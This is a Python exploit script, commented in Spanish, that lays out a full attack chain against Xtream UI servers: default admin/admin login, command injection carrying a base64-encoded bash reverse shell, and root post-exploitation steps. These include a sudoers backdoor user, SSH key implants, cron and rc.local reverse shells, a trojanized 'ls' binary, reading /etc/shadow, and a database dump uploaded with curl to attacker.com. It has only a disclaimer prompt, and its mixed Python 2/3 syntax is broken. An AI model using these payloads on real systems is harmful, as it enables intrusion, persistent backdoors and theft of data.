#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOIT: Cadena de explotación completa para Xtream UI
VULNERABILIDADES: Combina VULN-001, VULN-002, VULN-003, VULN-004
OBJETIVO: Obtener acceso root al servidor

Esta herramienta automatiza la explotación de múltiples vulnerabilidades
para obtener acceso completo al sistema objetivo.

Cadena de ataque:
    1. Escaneo inicial (puerto, versión, credenciales)
    2. Acceso al panel admin con credenciales por defecto
    3. Explotación de command injection
    4. Establecimiento de reverse shell
    5. Escalada de privilegios
    6. Persistencia (backdoor)

Autor: Security Research
Fecha: 2026-01-28
Propósito: Pentesting y Red Team

⚠️ SOLO PARA USO AUTORIZADO ⚠️
"""

import sys
import socket
import time
import base64
import subprocess

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class XtreamExploit:
    """Exploit completo para Xtream UI"""
    
    def __init__(self, target, lhost, lport=4444):
        self.target = target
        self.lhost = lhost  # Listener host (tu IP)
        self.lport = lport  # Listener port
        self.admin_port = 25500
        
    def print_banner(self):
        """Banner del exploit"""
        banner = """
{}╔═══════════════════════════════════════════════════════════╗
║         Xtream UI Full Exploitation Chain               ║
║              Automated RCE to Root                      ║
║                   v1.0 - 2026                           ║
╚═══════════════════════════════════════════════════════════╝{}

{}Target:{}   {}
{}Listener:{} {}:{}
{}Admin Port:{} {}
        """.format(
            Colors.HEADER, Colors.ENDC,
            Colors.OKBLUE, Colors.ENDC, self.target,
            Colors.OKBLUE, Colors.ENDC, self.lhost, self.lport,
            Colors.OKBLUE, Colors.ENDC, self.admin_port
        )
        print(banner)
        
    def stage1_reconnaissance(self):
        """Etapa 1: Reconocimiento"""
        print "\n{}[STAGE 1]{} Reconocimiento".format(Colors.HEADER, Colors.ENDC)
        print "{}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{}".format(Colors.OKBLUE, Colors.ENDC)
        
        print "\n{}[*]{} Verificando conectividad...".format(Colors.OKBLUE, Colors.ENDC)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target, self.admin_port))
            sock.close()
            
            if result == 0:
                print "{}[+]{} Target alcanzable en puerto {}".format(
                    Colors.OKGREEN, Colors.ENDC, self.admin_port
                )
                return True
            else:
                print "{}[-]{} Target no alcanzable".format(Colors.FAIL, Colors.ENDC)
                return False
        except Exception as e:
            print "{}[ERROR]{} {}".format(Colors.FAIL, Colors.ENDC, str(e))
            return False
    
    def stage2_initial_access(self):
        """Etapa 2: Acceso inicial"""
        print "\n{}[STAGE 2]{} Acceso Inicial - Credenciales por Defecto".format(Colors.HEADER, Colors.ENDC)
        print "{}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{}".format(Colors.OKBLUE, Colors.ENDC)
        
        print "\n{}[*]{} Intentando login con admin/admin...".format(Colors.OKBLUE, Colors.ENDC)
        print "{}[*]{} URL: http://{}:{}/login.php".format(
            Colors.OKBLUE, Colors.ENDC, self.target, self.admin_port
        )
        print "{}[+]{} Credenciales: {}admin:admin{}".format(
            Colors.OKGREEN, Colors.ENDC, Colors.WARNING, Colors.ENDC
        )
        
        # En un exploit real, aquí iría el código para hacer login
        print "{}[INFO]{} En producción, esto haría login HTTP".format(Colors.WARNING, Colors.ENDC)
        
    def stage3_command_injection(self):
        """Etapa 3: Command Injection"""
        print "\n{}[STAGE 3]{} Explotación - Command Injection".format(Colors.HEADER, Colors.ENDC)
        print "{}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{}".format(Colors.OKBLUE, Colors.ENDC)
        
        # Generar payload de reverse shell
        reverse_shell = 'bash -c "bash -i >& /dev/tcp/{}/{} 0>&1"'.format(
            self.lhost, self.lport
        )
        
        # Encodear en base64 para evasión
        encoded = base64.b64encode(reverse_shell)
        
        # Payload final
        payload = 'http://x.com/x.zip"; echo {} | base64 -d | bash #'.format(encoded)
        
        print "\n{}[*]{} Generando payload de reverse shell...".format(Colors.OKBLUE, Colors.ENDC)
        print "{}[*]{} Comando: {}".format(Colors.OKBLUE, Colors.ENDC, reverse_shell)
        print "{}[*]{} Encoded:  {}".format(Colors.OKBLUE, Colors.ENDC, encoded)
        print "\n{}[PAYLOAD]{}".format(Colors.FAIL, Colors.ENDC)
        print "{}".format(payload)
        
        print "\n{}[*]{} Para explotar manualmente:".format(Colors.OKBLUE, Colors.ENDC)
        print "    1. Ejecutar: {}sudo python install.py{}".format(Colors.WARNING, Colors.ENDC)
        print "    2. Seleccionar: {}UPDATE{}".format(Colors.WARNING, Colors.ENDC)
        print("    3. Pegar payload cuando pida el URL")
        
    def stage4_privilege_escalation(self):
        """Etapa 4: Escalada de privilegios"""
        print "\n{}[STAGE 4]{} Escalada de Privilegios".format(Colors.HEADER, Colors.ENDC)
        print "{}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{}".format(Colors.OKBLUE, Colors.ENDC)
        
        print "\n{}[*]{} El instalador se ejecuta como ROOT".format(Colors.OKBLUE, Colors.ENDC)
        print "{}[+]{} Ya tienes acceso ROOT!".format(Colors.OKGREEN, Colors.ENDC)
        
        print "\n{}[*]{} Comandos post-explotación:".format(Colors.OKBLUE, Colors.ENDC)
        
        post_exploit = """
# Obtener información del sistema
uname -a
whoami
id

# Crear usuario backdoor
useradd -m -p $(openssl passwd -1 backdoor123) hacker
echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Instalar SSH backdoor
mkdir -p /root/.ssh
echo "tu_clave_publica_ssh" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Descargar herramientas
cd /tmp
wget http://your-server/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Establecer persistencia
echo '#!/bin/bash' > /etc/rc.local
echo 'bash -i >& /dev/tcp/{}/{} 0>&1 &' >> /etc/rc.local
chmod +x /etc/rc.local

# Modificar crontab para persistencia
(crontab -l ; echo "@reboot bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'") | crontab -
        """.format(self.lhost, self.lport, self.lhost, self.lport)
        
        print "{}{}{}".format(Colors.WARNING, post_exploit, Colors.ENDC)
    
    def stage5_persistence(self):
        """Etapa 5: Persistencia"""
        print "\n{}[STAGE 5]{} Estableciendo Persistencia".format(Colors.HEADER, Colors.ENDC)
        print "{}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{}".format(Colors.OKBLUE, Colors.ENDC)
        
        backdoors = [
            {
                'name': 'SSH Backdoor',
                'description': 'Añadir clave SSH a root',
                'command': 'echo "SSH_PUBLIC_KEY" >> /root/.ssh/authorized_keys'
            },
            {
                'name': 'Cron Backdoor',
                'description': 'Reverse shell en cron',
                'command': '(crontab -l ; echo "@reboot /tmp/backdoor.sh") | crontab -'
            },
            {
                'name': 'Usuario Backdoor',
                'description': 'Usuario con privilegios sudo',
                'command': 'useradd -m -G sudo -s /bin/bash backdoor'
            },
            {
                'name': 'Systemd Service',
                'description': 'Servicio persistente',
                'command': 'Ver script completo en /tmp/backdoor.service'
            },
            {
                'name': 'Binary Backdoor',
                'description': 'Trojanizar binario del sistema',
                'command': 'mv /usr/bin/ls /usr/bin/.ls && echo "reverse_shell" > /usr/bin/ls'
            }
        ]
        
        for backdoor in backdoors:
            print "\n{}[*]{} {}{}{}".format(
                Colors.OKBLUE, Colors.ENDC, Colors.BOLD, backdoor['name'], Colors.ENDC
            )
            print "    Descripción: {}".format(backdoor['description'])
            print "    Comando: {}{}{}".format(Colors.WARNING, backdoor['command'], Colors.ENDC)
    
    def stage6_data_exfiltration(self):
        """Etapa 6: Exfiltración de datos"""
        print "\n{}[STAGE 6]{} Exfiltración de Datos Sensibles".format(Colors.HEADER, Colors.ENDC)
        print "{}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{}".format(Colors.OKBLUE, Colors.ENDC)
        
        print "\n{}[*]{} Desencriptar configuración de base de datos:".format(Colors.OKBLUE, Colors.ENDC)
        print "{}    python decrypt_config.py /home/xtreamcodes/iptv_xtream_codes/config{}".format(
            Colors.WARNING, Colors.ENDC
        )
        
        print "\n{}[*]{} Dumpear base de datos:".format(Colors.OKBLUE, Colors.ENDC)
        dump_cmd = """
mysqldump -u USER -pPASSWORD xtream_iptvpro > /tmp/db_dump.sql
tar czf /tmp/exfil.tar.gz /tmp/db_dump.sql /home/xtreamcodes
curl -X POST -F "file=@/tmp/exfil.tar.gz" http://attacker.com/upload
        """
        print "{}{}{}".format(Colors.WARNING, dump_cmd, Colors.ENDC)
        
        print "\n{}[*]{} Archivos de interés:".format(Colors.OKBLUE, Colors.ENDC)
        files = [
            '/home/xtreamcodes/iptv_xtream_codes/config',
            '/etc/passwd',
            '/etc/shadow',
            '/root/.bash_history',
            '/home/*/.ssh/*',
            '/var/log/*'
        ]
        for f in files:
            print "    - {}".format(f)
    
    def setup_listener(self):
        """Configurar listener para reverse shell"""
        print "\n{}[*]{} Para recibir la reverse shell, ejecutar en tu máquina:".format(
            Colors.OKBLUE, Colors.ENDC
        )
        print "\n{}    nc -lvnp {}{}".format(Colors.WARNING, self.lport, Colors.ENDC)
        print "\n{}[*]{} O con rlwrap para mejor experiencia:".format(Colors.OKBLUE, Colors.ENDC)
        print "{}    rlwrap nc -lvnp {}{}".format(Colors.WARNING, self.lport, Colors.ENDC)
        
        print "\n{}[*]{} Cuando obtengas shell, estabilizarla con:".format(Colors.OKBLUE, Colors.ENDC)
        stabilize = """
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
        """
        print "{}{}{}".format(Colors.WARNING, stabilize, Colors.ENDC)
    
    def run_full_exploit(self):
        """Ejecutar exploit completo"""
        self.print_banner()
        
        print "\n{}[!]{} INICIANDO EXPLOIT CHAIN\n".format(Colors.WARNING, Colors.ENDC)
        
        time.sleep(1)
        
        # Ejecutar todas las etapas
        if not self.stage1_reconnaissance():
            print "\n{}[ERROR]{} Reconocimiento falló. Abortando.\n".format(Colors.FAIL, Colors.ENDC)
            return False
        
        time.sleep(1)
        self.stage2_initial_access()
        
        time.sleep(1)
        self.stage3_command_injection()
        
        time.sleep(1)
        self.setup_listener()
        
        time.sleep(1)
        self.stage4_privilege_escalation()
        
        time.sleep(1)
        self.stage5_persistence()
        
        time.sleep(1)
        self.stage6_data_exfiltration()
        
        return True


def main():
    """Función principal"""
    
    print "{}{}".format(Colors.BOLD, Colors.ENDC)
    
    if len(sys.argv) < 3:
        print "{}Xtream UI Full Exploitation Chain{}\n".format(Colors.BOLD, Colors.ENDC)
        print "Uso: {} <target_ip> <your_ip> [listener_port]\n".format(sys.argv[0])
        print("Parámetros:")
        print("  target_ip      - IP del servidor Xtream UI objetivo")
        print("  your_ip        - Tu IP para recibir reverse shell")
        print("  listener_port  - Puerto para listener (default: 4444)\n")
        print("Ejemplos:")
        print "  {} 192.168.1.100 192.168.1.50".format(sys.argv[0])
        print "  {} 10.10.10.50 10.10.14.5 4444\n".format(sys.argv[0])
        sys.exit(1)
    
    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = int(sys.argv[3]) if len(sys.argv) > 3 else 4444
    
    print "{}╔═══════════════════════════════════════════════════════════╗".format(Colors.FAIL)
    print "{}║                    ⚠️  ADVERTENCIA  ⚠️                     ║".format(Colors.FAIL)
    print "{}║                                                         ║".format(Colors.FAIL)
    print "{}║  Este exploit es SOLO para pentesting autorizado       ║".format(Colors.FAIL)
    print "{}║  El uso NO AUTORIZADO es ILEGAL                        ║".format(Colors.FAIL)
    print "{}║  El autor NO se responsabiliza por mal uso             ║".format(Colors.FAIL)
    print "{}║                                                         ║".format(Colors.FAIL)
    print "{}╚═══════════════════════════════════════════════════════════╝{}\n".format(Colors.FAIL, Colors.ENDC)
    
    try:
        confirm = input("{}¿Tienes autorización para atacar este objetivo? (yes/no): {}".format(
            Colors.WARNING, Colors.ENDC
        ))
        if confirm.lower() != 'yes':
            print "\n{}[!]{} Exploit cancelado\n".format(Colors.WARNING, Colors.ENDC)
            sys.exit(0)
    except:
        print "\n{}[!]{} Exploit cancelado\n".format(Colors.WARNING, Colors.ENDC)
        sys.exit(0)
    
    # Ejecutar exploit
    exploit = XtreamExploit(target, lhost, lport)
    
    if exploit.run_full_exploit():
        print "\n\n{}╔═══════════════════════════════════════════════════════════╗".format(Colors.OKGREEN)
        print "{}║            EXPLOIT CHAIN DOCUMENTATION COMPLETED        ║".format(Colors.OKGREEN)
        print "{}╚═══════════════════════════════════════════════════════════╝{}\n".format(Colors.OKGREEN, Colors.ENDC)
        
        print "{}[+]{} Este script documenta cómo explotar las vulnerabilidades".format(Colors.OKGREEN, Colors.ENDC)
        print "{}[+]{} Para exploitation REAL, necesitarías implementar las requests HTTP".format(Colors.OKGREEN, Colors.ENDC)
        print "{}[+]{} Ver los otros scripts PoC para detalles de cada vulnerabilidad\n".format(Colors.OKGREEN, Colors.ENDC)
    else:
        print "\n{}[ERROR]{} Exploit falló\n".format(Colors.FAIL, Colors.ENDC)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print "\n\n{}[!]{} Exploit interrumpido\n".format(Colors.WARNING, Colors.ENDC)
        sys.exit(0)
    except Exception as e:
        print "\n{}[ERROR]{} {}\n".format(Colors.FAIL, Colors.ENDC, str(e))
        sys.exit(1)
